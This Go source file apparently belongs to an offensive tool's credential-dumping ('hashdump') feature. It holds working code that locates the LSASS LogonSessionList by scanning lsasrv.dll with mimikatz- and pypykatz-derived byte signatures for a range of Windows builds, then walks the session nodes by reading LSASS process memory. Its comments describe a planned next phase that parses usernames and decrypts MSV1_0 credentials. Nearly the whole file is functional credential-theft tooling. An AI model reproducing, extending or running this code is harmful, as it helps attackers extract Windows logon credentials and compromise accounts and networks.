package commands

// LSASS LogonSessionList walker — Phase 2B foundation for hashdump in-situ.
//
// This file owns the cross-platform pieces of Phase 2B so they can be unit
// tested on Linux without a Windows host. It defines:
//
//  1. lsassReader: a small interface that abstracts ReadProcessMemory. The
//     concrete Windows implementation (lsassRemoteReader) lives in
//     lsass_remote_windows.go; tests use bufferReader (lsass_logonlist_test.go).
//  2. findLogonSessionListAnchor: scans a captured lsasrv.dll image for the
//     mimikatz LogonSessionList signature, decodes the RIP-relative MOV that
//     loads the global, and returns the LSASS-virtual address of the
//     LogonSessionList head sentinel.
//  3. walkLogonSessionList: follows Flink pointers from the head sentinel
//     until either the cursor wraps back to the anchor (clean termination)
//     or a safety cap fires.
//
// Phase 2C will extend this with username/domain/AuthPkg field parsing and
// MSV1_0 credential decryption.

import (
	"encoding/binary"
	"fmt"
)

// logonSessionListVariant describes a Windows-build-specific byte pattern
// that brackets the MOV r8, [LogonSessionList] instruction in lsasrv.dll.
// Different Windows builds compile LsaApLogonUserEx2 with different
// instruction sequences, so the sigscan must try multiple patterns.
type logonSessionListVariant struct {
	Name             string
	Signature        string
	MovInstrOffset   int // offset from match start to the MOV instruction
	MovInstrLen      int // total length of the MOV (7 for RIP-relative)
	MovDispFieldOffs int // offset of disp32 inside the MOV (3 for 4C 8B 05)
}

// logonSessionListVariants lists sigscan patterns in preference order (newest
// first). findLogonSessionListAnchor tries each until one matches.
//
// Patterns derived from pypykatz lsa_template_nt6.py (MsvTemplate.get_template)
// and mimikatz kuhl_m_sekurlsa.c. Each covers a specific Windows build range.
var logonSessionListVariants = []logonSessionListVariant{
	{
		// Win11 22H2–23H2 (builds 22621–26099, pypykatz WIN_11_2023)
		Name:             "Win11_22H2_23H2",
		Signature:        "45 89 37 4C 8B F7 8B F3 45 85 C0 0F",
		MovInstrOffset:   24,
		MovInstrLen:      7,
		MovDispFieldOffs: 3,
	},
	{
		// Server 2022 / Win11 21H2 (builds 20348–22620, pypykatz WIN_11_2022)
		Name:             "Server2022_Win11_21H2",
		Signature:        "45 89 34 24 4C 8B FF 8B F3 45 85 C0 74",
		MovInstrOffset:   21,
		MovInstrLen:      7,
		MovDispFieldOffs: 3,
	},
	{
		// Win10 21H2 — Win11 23H2 (mimikatz signature_x64_w8 — broad fallback)
		Name:             "Win10_21H2_Win11_23H2",
		Signature:        "33 F6 89 77 00 4C 8D 4D D0 4C 8B 05 ?? ?? ?? ?? 48 8D 1D ?? ?? ?? ??",
		MovInstrOffset:   9,
		MovInstrLen:      7,
		MovDispFieldOffs: 3,
	},
	{
		// Win10 1903–21H1 (builds 18362–19045, pypykatz WIN_10_1903)
		Name:             "Win10_1903_21H1",
		Signature:        "33 FF 41 89 37 4C 8B F3 45 85 C0 74",
		MovInstrOffset:   20,
		MovInstrLen:      7,
		MovDispFieldOffs: 3,
	},
	{
		// Win10 1803–1809 / Server 2019 (builds 17134–17763, pypykatz WIN_10_1803)
		Name:             "Win10_1803_Server2019",
		Signature:        "33 FF 41 89 37 4C 8B F3 45 85 C9 74",
		MovInstrOffset:   20,
		MovInstrLen:      7,
		MovDispFieldOffs: 3,
	},
	{
		// Win10 1703 (build 15063, pypykatz WIN_10_1703)
		Name:             "Win10_1703",
		Signature:        "33 FF 45 89 37 48 8B F3 45 85 C9 74",
		MovInstrOffset:   20,
		MovInstrLen:      7,
		MovDispFieldOffs: 3,
	},
	{
		// Win10 1507–1607 / Server 2016 (builds 10240–14393, pypykatz WIN_10_1507)
		Name:             "Win10_1507_Server2016",
		Signature:        "33 FF 41 89 37 4C 8B F3 45 85 C0 74",
		MovInstrOffset:   13,
		MovInstrLen:      7,
		MovDispFieldOffs: 3,
	},
}

// LogonSessionListSignature is kept for backward compatibility with tests.
const (
	LogonSessionListSignature        = "33 F6 89 77 00 4C 8D 4D D0 4C 8B 05 ?? ?? ?? ?? 48 8D 1D ?? ?? ?? ??"
	logonSessionListMovInstrOffset   = 9
	logonSessionListMovInstrLen      = 7
	logonSessionListMovDispFieldOffs = 3
)

// lsassReader abstracts ReadProcessMemory so the Phase 2B walker is testable
// without a Windows host. Concrete implementations are expected to:
//
//   - return exactly `size` bytes on success (short reads are errors),
//   - never return a buffer aliased with internal state (callers retain it),
//   - be safe to call repeatedly with arbitrary addresses within the target
//     process; pages outside committed regions should return an error rather
//     than silently zero-filling.
type lsassReader interface {
	Read(addr uintptr, size uint32) ([]byte, error)
}

// listEntry is the doubly-linked list head/node prefix shared by every node
// in LogonSessionList. On x64 both pointers are 8 bytes; total size 16 bytes.
type listEntry struct {
	Flink uintptr
	Blink uintptr
}

// logonListNode captures the metadata Phase 2B emits for each walked node.
// Address is the LSASS-virtual address of the node; Flink/Blink are decoded
// from the first 16 bytes of Raw. Phase 2C will overlay struct parsing onto
// Raw to extract username, domain, AuthPkg, and credential blobs.
type logonListNode struct {
	Address uintptr
	Flink   uintptr
	Blink   uintptr
	Raw     []byte
}

// findLogonSessionListAnchor scans `lsasrvBytes` for the LogonSessionList
// anchor using multiple build-specific signatures (tried in preference order).
// Returns the LSASS-virtual address of the LogonSessionList head sentinel and
// the name of the matched variant for diagnostics.
func findLogonSessionListAnchor(lsasrvBytes []byte, lsasrvBase uintptr) (uintptr, error) {
	addr, _, err := findLogonSessionListAnchorMulti(lsasrvBytes, lsasrvBase)
	return addr, err
}

func findLogonSessionListAnchorMulti(lsasrvBytes []byte, lsasrvBase uintptr) (uintptr, string, error) {
	var lastErr error
	for _, v := range logonSessionListVariants {
		pat, mask, err := parseHexPattern(v.Signature)
		if err != nil {
			lastErr = fmt.Errorf("internal: bad signature %q: %w", v.Name, err)
			continue
		}
		hit := findPattern(lsasrvBytes, pat, mask)
		if hit < 0 {
			continue
		}
		movStart := hit + v.MovInstrOffset
		if movStart < 0 || movStart+v.MovInstrLen > len(lsasrvBytes) {
			lastErr = fmt.Errorf("variant %q: MOV instruction at offset %d outside buffer (size %d)", v.Name, movStart, len(lsasrvBytes))
			continue
		}
		target, _, ok := resolveRIPRelative(lsasrvBytes, movStart, v.MovDispFieldOffs, v.MovInstrLen)
		if !ok {
			lastErr = fmt.Errorf("variant %q: RIP-relative target outside buffer (matched at %d, MOV at %d)", v.Name, hit, movStart)
			continue
		}
		return lsasrvBase + uintptr(target), v.Name, nil
	}
	if lastErr != nil {
		return 0, "", fmt.Errorf("LogonSessionList: no variant matched in %d-byte lsasrv.dll (last error: %w)", len(lsasrvBytes), lastErr)
	}
	return 0, "", fmt.Errorf("LogonSessionList: no variant matched in %d-byte lsasrv.dll (%d variants tried)", len(lsasrvBytes), len(logonSessionListVariants))
}

// walkLogonSessionList follows Flink pointers from the LogonSessionList head
// sentinel. The walk terminates when:
//
//   - the cursor returns to anchorAddr (clean: list fully traversed), or
//   - maxNodes iterations elapse (defensive cap to bound runaway walks), or
//   - a node read fails or returns an obviously bad pointer (null Flink, or
//     a self-referential node), at which point the partial list is returned
//     alongside the error so callers can still report what was collected.
//
// nodeReadSize controls how many bytes are pulled per node. Phase 2B uses
// 0x100 (256) because that captures both the LIST_ENTRY prefix and enough
// scaffolding for cross-reference scans without depending on field offsets
// that drift across Windows builds.
func walkLogonSessionList(r lsassReader, anchorAddr uintptr, nodeReadSize uint32, maxNodes int) ([]logonListNode, error) {
	if r == nil {
		return nil, fmt.Errorf("nil lsassReader")
	}
	if anchorAddr == 0 {
		return nil, fmt.Errorf("zero anchor address")
	}
	if nodeReadSize < 16 {
		return nil, fmt.Errorf("nodeReadSize %d too small (need >=16 for LIST_ENTRY)", nodeReadSize)
	}
	if maxNodes <= 0 {
		maxNodes = 4096
	}

	head, err := readListEntry(r, anchorAddr)
	if err != nil {
		return nil, fmt.Errorf("read LogonSessionList head at 0x%X: %w", anchorAddr, err)
	}
	if head.Flink == 0 || head.Flink == anchorAddr {
		return nil, fmt.Errorf("LogonSessionList head is empty (anchor=0x%X, head.Flink=0x%X)", anchorAddr, head.Flink)
	}

	nodes := make([]logonListNode, 0, 8)
	cursor := head.Flink
	visited := make(map[uintptr]bool, 8)
	for i := 0; i < maxNodes; i++ {
		if cursor == anchorAddr {
			return nodes, nil // walked back to head: clean termination
		}
		if cursor == 0 {
			return nodes, fmt.Errorf("null Flink encountered at node index %d (after %d successful reads)", i, len(nodes))
		}
		if visited[cursor] {
			return nodes, fmt.Errorf("cycle detected at node index %d (cursor=0x%X already visited)", i, cursor)
		}
		visited[cursor] = true

		buf, err := r.Read(cursor, nodeReadSize)
		if err != nil {
			return nodes, fmt.Errorf("read node %d at 0x%X: %w", i, cursor, err)
		}
		if len(buf) < 16 {
			return nodes, fmt.Errorf("short read at node %d (0x%X): got %d bytes, need >=16", i, cursor, len(buf))
		}
		flink := uintptr(binary.LittleEndian.Uint64(buf[0:8]))
		blink := uintptr(binary.LittleEndian.Uint64(buf[8:16]))
		nodes = append(nodes, logonListNode{
			Address: cursor,
			Flink:   flink,
			Blink:   blink,
			Raw:     buf,
		})
		cursor = flink
	}
	return nodes, fmt.Errorf("walk hit safety cap of %d nodes without returning to anchor (last cursor=0x%X)", maxNodes, cursor)
}

func readListEntry(r lsassReader, addr uintptr) (listEntry, error) {
	buf, err := r.Read(addr, 16)
	if err != nil {
		return listEntry{}, err
	}
	if len(buf) < 16 {
		return listEntry{}, fmt.Errorf("short read: got %d bytes, want 16", len(buf))
	}
	return listEntry{
		Flink: uintptr(binary.LittleEndian.Uint64(buf[0:8])),
		Blink: uintptr(binary.LittleEndian.Uint64(buf[8:16])),
	}, nil
}

// scanRawForLUID returns true if the given 8-byte LUID value appears anywhere
// in the node's raw bytes. Phase 2B uses this to cross-reference walked nodes
// against the Phase 1 LSA-API session list — a positive match validates that
// the walk landed on real LSAP_LOGON_SESSION_LIST nodes without depending on
// build-specific field offsets. Phase 2C will replace this with structured
// LUID extraction once offsets are calibrated.
func scanRawForLUID(raw []byte, luid uint64) bool {
	if len(raw) < 8 {
		return false
	}
	var needle [8]byte
	binary.LittleEndian.PutUint64(needle[:], luid)
	last := len(raw) - 8
	for i := 0; i <= last; i++ {
		if raw[i] == needle[0] && raw[i+1] == needle[1] && raw[i+2] == needle[2] && raw[i+3] == needle[3] &&
			raw[i+4] == needle[4] && raw[i+5] == needle[5] && raw[i+6] == needle[6] && raw[i+7] == needle[7] {
			return true
		}
	}
	return false
}
